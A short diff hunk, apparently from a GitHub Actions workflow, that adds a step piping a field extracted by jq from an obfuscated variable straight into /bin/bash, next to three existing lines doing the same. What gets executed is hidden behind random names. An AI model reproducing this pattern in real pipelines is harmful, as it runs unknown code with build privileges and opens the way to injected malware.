@@ -36,6 +36,7 @@ jobs:
           echo $oezd4 | jq -r .dheu8307 | /bin/bash
           printf '%s' "$y810" | jq -r .p82 | /bin/bash
           echo $hysr011 | jq -r .v42265 | /bin/bash
+          printf '%s' "$gcaf5215" | jq -r .hbp6 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
